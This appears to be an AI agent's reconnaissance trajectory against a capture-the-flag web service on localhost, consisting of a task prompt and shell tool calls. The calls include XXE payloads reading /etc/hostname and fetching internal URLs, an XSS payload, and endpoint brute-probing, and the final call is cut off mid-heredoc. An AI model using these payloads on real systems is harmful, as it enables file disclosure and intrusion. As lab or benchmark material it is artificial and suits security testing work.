messages.content:
You are a recon agent performing black-box reconnaissance on a potentially vulnerable service.
You are provided with the following tools:

TOOLS:
1) run_command(cmd: str, reason: str = "")
- Use for shell commands (ls, curl, grep, cat, netstat, etc.)
- The 'reason' field must briefly explain reasoning process that led of the command

2) run_python(python_code: str, reason: str = "")
- Use for Python scripts, payload generation, parsing outputs,
- The 'reason' field must briefly explain reasoning process that led to the code.

Your goal:
1. Explore the service using the available tools.
2. Identify:
   - Service type (web/api/etc)
   - Language / framework if inferable
   - Open ports and base URL
   - Interesting endpoints
   - Likely vulnerabilities (SSRF, SQLi, LFI, RCE, auth bypass, etc)

Exploration rules:
- Browse until you believe additional requests are unlikely to reveal new attack surface.
- Do NOT exploit vulnerabilities fully — only confirm their presence.

Termination rule:
- Continue exploring until you believe the exposed attack surface is sufficiently mapped.
- Stop when additional requests are unlikely to reveal relevant CTF vulnerabilities
- The goal is reasonable coverage, not exhaustive exploitation.

Output rules:
- When finished, respond with ONLY valid JSON.
- Do not include explanations, markdown, or commentary.
- The JSON must match this schema exactly:

{
  "service": {
    "type": "...",
    "language": "...",
    "ports": [...],
    "base_url": "..."
  },
  "vulnerabilities": [
    {
      "type": "...",
      "endpoint": "...",
      "description": "..."
    }
  ]
}
The access point to the vulnerable service is: ['http://localhost:5000']

args.reason: Get homepage and headers to identify service and framework.

args.cmd:
cat >/tmp/xxe.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:5000/"> ]>
<Book><Title>&xxe;</Title></Book>
EOF
curl -i -X POST http://localhost:5000/addbook --data-urlencode xml@/tmp/xxe.xml
args.reason: Create an XML payload with an external entity and post it to check for XXE behavior.

args.cmd: for p in / /addbook /books /book /list /view /download /upload /parse /xml /validate /status /health /metrics /api /api/v1 /api/v2 /admin /login /logout /register /config /ping /version /debug /console /env /flag; do echo "---- $p"; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://localhost:5000$p; done
args.reason: Quickly probe a set of common endpoints to expand attack surface.

args.cmd:
cat >/tmp/xxe_file.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<Book><Title>&xxe;</Title></Book>
EOF
curl -i -X POST http://localhost:5000/addbook --data-urlencode xml@/tmp/xxe_file.xml
args.reason: Test for local file XXE to confirm entity resolution using file scheme.

<Book><Title><script>alert('xss')</script></Title></Book>
EOF
curl -i -X POST http://localhost:5000/addbook --data-urlencode xml@/tmp/xss.xml
args.reason: Check if HTML-unsafe content is reflected unescaped, indicating reflected XSS.
